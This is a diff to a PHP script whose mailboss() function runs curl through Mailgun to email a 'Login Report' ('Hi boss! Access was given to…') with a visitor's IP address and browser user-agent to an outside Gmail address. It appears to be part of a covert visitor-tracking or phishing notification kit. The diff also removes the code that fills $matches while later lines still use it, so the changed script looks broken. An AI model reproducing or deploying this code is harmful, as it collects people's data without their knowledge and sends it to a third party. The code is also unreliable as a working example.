@@ -60,7 +60,7 @@ function mailboss()
             -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
-            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".sysinfo()."</pre><br>'
+            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".getBrowser()."</pre><br>'
             ");   
 }
 
@@ -76,21 +76,6 @@ function getUserIpAddr(){
     }
     
    return $ip; 
-}
-
-function sysinfo(){
-    
-    $ua = getBrowser();
-    print "<pre>";
-    $patterns = array();
-    $patterns[0] = '/Array/';
-    $patterns[1] = '/\(/';
-    $patterns[2] = '/\)/';
-    $dd= preg_replace($patterns,'System details:',print_r($ua,true));
-    $bb = htmlspecialchars($dd);
-    print "</pre>";
-    
-    return $bb;
 }
 
   function getBrowser() {
@@ -130,12 +115,6 @@ function sysinfo(){
     }
   
   
-    // finally get the correct version number
-    $known = array('Version', $ub, 'other');
-    $pattern = '#(?<browser>' . join('|', $known) . ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
-    if (!preg_match_all($pattern, $u_agent, $matches)) {
-      // we have no matching number just continue
-    }
   
     // see how many we have
     $i = count($matches['browser']);
@@ -154,12 +133,9 @@ function sysinfo(){
     // check if we have a number
     if ($version==null || $version=="") {$version="?";}
   
-  return array(
-    'userAgent' => $u_agent,
-    'name'      => $bname,
-    'version'   => $version,
-    'platform'  => $platform,
-    );
+    echo $u_agent;
+    return $u_agent;
+
   }
 
   
